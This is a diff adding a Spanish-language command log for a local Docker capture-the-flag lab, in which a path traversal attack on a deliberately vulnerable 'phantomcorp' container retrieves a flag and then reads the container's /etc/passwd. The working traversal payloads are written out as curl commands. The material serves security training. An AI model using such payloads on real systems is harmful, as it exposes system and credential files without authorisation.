@@ -98,3 +98,29 @@ docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -
 # con CRLF normalizados. No se modificó .progreso del repositorio compartido.
 # Salidas observadas: evidencia/salidas/r3_01_baseline.txt a r3_04_verificador.txt.
 
+
+
+# --- RETO 4: Path traversal / LFI (GET /descargar?archivo=) ---
+# Entorno levantado con Docker (consola attacker + target phantomcorp):
+docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/lab07-explotacion/entorno/target.compose.yml up -d --build
+
+# 1. Linea base: descarga normal del catalogo publico (HTTP 200 esperado).
+docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/lab07-explotacion/entorno/target.compose.yml exec -T attacker curl -sS -i -G http://phantomcorp/descargar --data-urlencode 'archivo=catalogo.txt'
+
+# 2. Payload de traversal hacia /app/flags/lfi.txt (fuera de /app/public):
+#    HTTP 200 con FLAG{path_traversal_lfi}.
+docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/lab07-explotacion/entorno/target.compose.yml exec -T attacker curl -sS -i -G http://phantomcorp/descargar --data-urlencode 'archivo=../flags/lfi.txt'
+
+# 3. Payload adicional para medir el alcance real (fuera de todo /app):
+#    HTTP 200 con el contenido real de /etc/passwd del contenedor.
+docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/lab07-explotacion/entorno/target.compose.yml exec -T attacker curl -sS -i -G http://phantomcorp/descargar --data-urlencode 'archivo=../../../../../../etc/passwd'
+
+# 4. Estado antes de entregar, validacion con el motor oficial y estado despues.
+#    Ejecutados desde la raiz del repositorio (host), no desde la consola attacker.
+bash ./ctf status 07
+bash ./ctf submit 07 R4 'FLAG{path_traversal_lfi}'
+bash ./ctf status 07
+
+# La flag fue aceptada por el motor oficial en esta copia local; el progreso
+# de este reto paso de 0/5 a 1/5. No se modifico el estado de los demas retos.
+# Salidas observadas: evidencia/salidas/r4_01_baseline_catalogo.txt a r4_06_status_despues.txt.
